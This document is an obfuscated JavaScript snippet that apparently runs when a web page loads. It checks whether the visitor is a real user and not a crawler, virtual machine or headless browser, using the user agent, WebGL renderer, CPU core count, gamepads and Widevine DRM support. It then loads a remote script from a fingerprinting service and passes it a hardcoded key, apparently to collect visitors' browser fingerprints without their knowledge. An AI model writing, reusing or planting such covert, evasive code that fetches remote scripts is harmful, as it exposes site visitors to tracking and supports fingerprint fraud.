(async () => {
	const rg = new RegExp("^Mozilla\/5.0.*AppleWebKit\/537.36.*Chrome\/.*Safari\/537.36$");
	if(!rg.test(navigator.userAgent)){
		return;
	}
	
    if (navigator.userAgent.indexOf('Mediapartners') >= 0) {
        return;
    };

    function dghdbldksjgkins(dghdbldksjgkins) {
        const jndsnkjhjsfnsfsf = document.cookie.match(new RegExp("(?:^|; )" + dghdbldksjgkins.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
        return jndsnkjhjsfnsfsf ? decodeURIComponent(jndsnkjhjsfnsfsf[1]) : undefined;
    };

    const sdjnkvsfjnkjdvjsd = window.btoa(navigator.userAgent);
    if (sdjnkvsfjnkjdvjsd == dghdbldksjgkins('fingerprinthash')) {
        return;
    };

    const cvvcjvkdhfdstgtggf = () => {
        try {
            const cvvcjvkdhfdshgfggf = new OffscreenCanvas(256, 256).getContext('webgl');
            const cvvcjvtdhfdshgfggf = cvvcjvkdhfdshgfggf.getExtension('WEBGL_debug_renderer_info');
            return cvvcjvkdhfdshgfggf.getParameter(cvvcjvtdhfdshgfggf.UNMASKED_RENDERER_WEBGL);
        } catch (err) {
            try {
                const cvvcjvkdhfdshgfggf = document.createElement('canvas').getContext('webgl');
                return cvvcjvkdhfdshgfggf.getParameter(cvvcjvkdhfdshgfggf.RENDERER);
            } catch (err) {
                return 'undefined';
            };
        };
    };
    const cvvcjvkdhfdstgfggf = cvvcjvkdhfdstgtggf();
    if (cvvcjvkdhfdstgfggf == 'undefined' || cvvcjvkdhfdstgfggf.indexOf('SwiftShader Device') >= 0 || cvvcjvkdhfdstgfggf.indexOf('VMware') >= 0 || cvvcjvkdhfdstgfggf.indexOf('Unknown') >= 0) {
        return;
    };

    const sdjjifdifhdsjgijd = navigator.hardwareConcurrency;
    if (sdjjifdifhdsjgijd < 4) {
        return;
    };

    const sdjjifdifhdsjgtjd = navigator.getGamepads();
    if (!(navigator.userAgent.indexOf('Firefox') >= 0) && !(navigator.userAgent.indexOf('FxiOS') >= 0) && !(navigator.userAgent.indexOf('iPhone') >= 0) && !(navigator.userAgent.indexOf('iPad') >= 0)) {
        if (sdjjifdifhdsjgtjd.toLocaleString() !== ',,,') {
            return;
        };
    } else {
        if (sdjjifdifhdsjgtjd.toLocaleString() !== '') {
            return;
        };
    };

    const soigisngsgoffjgdf = () => {
        if (navigator.userAgent.indexOf('Firefox') >= 0 || navigator.userAgent.indexOf('FxiOS') >= 0 || navigator.userAgent.indexOf('iPhone') >= 0 || navigator.userAgent.indexOf('iPad') >= 0) {
            if (!(typeof (navigator.userAgentData) == 'undefined')) {
                return false;
            };
        };
        return true;
    };

    const soigisngsgofjfgdf = soigisngsgoffjgdf();
    if (!soigisngsgofjfgdf) {
        return;
    };

    const cwwcjvkdhfdstgfggf = async () => {
        const sfdosjgvnjsvdsif = 'com.widevine.alpha';
        const sdlkbmlfkdgmdtdb = () => {
            if (!(navigator.userAgent.indexOf('YaBrowser') >= 0) && !(navigator.userAgent.indexOf('Firefox') >= 0)) {
                return [{
                    videoCapabilities: [{
                        contentType: 'video/mp4; codecs="avc1.42E01E"',
                        robustness: "SW_SECURE_DECODE"
                    }],
                    persistentState: "required",
                    sessionTypes: ["persistent-license"]
                }];
            } else {
                return [{
                    videoCapabilities: [{
                        contentType: 'video/mp4; codecs="avc1.42E01E"',
                        robustness: "SW_SECURE_DECODE"
                    }],
                    persistentState: "required"
                }];
            };
        };
        const sdlkbmlfkdgmdfdb = sdlkbmlfkdgmdtdb();
        const sfdosjgfnjsvdsif = navigator.requestMediaKeySystemAccess(sfdosjgvnjsvdsif, sdlkbmlfkdgmdfdb).then(keySystem => {
            return "success";
        }).catch(error => { });
        return sfdosjgfnjsvdsif.then(function (dfsfjlfjaksf) {
            if (dfsfjlfjaksf == 'success') {
                return true;
            } else {
                return false;
            };
        });
    };

    const cwwcjvkdhtdstgеggt = async () => {
        if (navigator.userAgent.indexOf('Windows') >= 0 || navigator.userAgent.indexOf('Macintosh') >= 0) {
            const cwwcjvkdhtdstgfggf = await cwwcjvkdhfdstgfggf();
            if (!(cwwcjvkdhtdstgfggf)) {
                return false;
            };
        } else {
            if (navigator.userAgent.indexOf('Linux') >= 0 || navigator.userAgent.indexOf('Android') >= 0) {
                if (!(navigator.userAgent.indexOf('OPR/') >= 0) || !(navigator.userAgent.indexOf('Firefox/') >= 0)) {
                    const cwwcjvkdhtdstgfggf = await cwwcjvkdhfdstgfggf();
                    if (!(cwwcjvkdhtdstgfggf)) {
                        return false;
                    };
                };
            };
        };
        return true;
    };

    const cwwcjvkdhfdstgеggt = await cwwcjvkdhtdstgеggt();
    if (cwwcjvkdhfdstgеggt == true) {
		  var a = document.createElement("script");
		  a.addEventListener("load", function(){ProcessFingerprint(false, "9mp97hsvm2pffefaqyr9veind51vpkpwc3h5nhhksadvvp3o8ozdolw2dfkkc9sh")})
		  a.type = "text/javascript";
		  a.src = "https://customfingerprints.bablosoft.com/clientsafe.js?" + Math.random();
		  document.getElementsByTagName("head")[0].appendChild(a)
    }
})();
